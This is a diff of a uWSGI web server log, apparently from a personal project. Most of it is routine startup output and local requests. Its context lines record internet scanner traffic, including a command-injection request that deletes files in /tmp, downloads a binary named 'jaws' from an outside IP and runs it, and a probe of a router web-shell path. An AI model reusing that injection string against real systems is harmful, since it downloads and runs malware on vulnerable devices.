@@ -274,3 +274,34 @@ True
 [pid: 12632|app: 0|req: 87/146] 197.52.32.186 () {34 vars in 552 bytes} [Sun Oct 22 14:03:18 2023] GET /shell?cd+/tmp;rm+-rf+*;wget+45.12.253.180/jaws;sh+/tmp/jaws => generated 207 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (2 switches on core 0)
 [pid: 12632|app: 0|req: 88/147] 45.142.182.101 () {28 vars in 289 bytes} [Sun Oct 22 14:15:45 2023] GET / => generated 10 bytes in 0 msecs (HTTP/1.1 200) 2 headers in 79 bytes (2 switches on core 0)
 [pid: 12631|app: 0|req: 60/148] 45.142.182.101 () {40 vars in 553 bytes} [Sun Oct 22 14:15:48 2023] POST /web_shell_cmd.gch => generated 207 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+*** Starting uWSGI 2.0.21 (64bit) on [Mon Oct 23 14:57:26 2023] ***
+compiled with version: 11.2.0 on 06 July 2023 08:18:53
+os: Linux-6.2.6-060206-generic #202303130630 SMP PREEMPT_DYNAMIC Mon Mar 13 11:49:45 UTC 2023
+nodename: ubuntu-vmware
+machine: aarch64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 4
+current working directory: /home/junyeong/python/server
+writing pidfile to ./uwsgi.pid
+detected binary path: /home/junyeong/anaconda3/envs/server/bin/uwsgi
+your processes number limit is 22913
+your memory page size is 4096 bytes
+detected max file descriptor number: 1048576
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address ./uwsgi.sock fd 3
+Python version: 3.10.11 (main, Apr 20 2023, 18:56:25) [GCC 11.2.0]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x25cb4d0
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 218760 bytes (213 KB) for 2 cores
+*** Operational MODE: preforking ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x25cb4d0 pid: 9898 (default app)
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 9898)
+spawned uWSGI worker 1 (pid: 9932, cores: 1)
+spawned uWSGI worker 2 (pid: 9933, cores: 1)
+[pid: 9932|app: 0|req: 1/1] 192.168.123.1 () {42 vars in 743 bytes} [Mon Oct 23 15:36:31 2023] GET / => generated 10 bytes in 17 msecs (HTTP/1.1 200) 2 headers in 79 bytes (1 switches on core 0)
+[pid: 9933|app: 0|req: 1/2] 192.168.123.1 () {42 vars in 698 bytes} [Mon Oct 23 15:36:31 2023] GET /favicon.ico => generated 207 bytes in 4 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
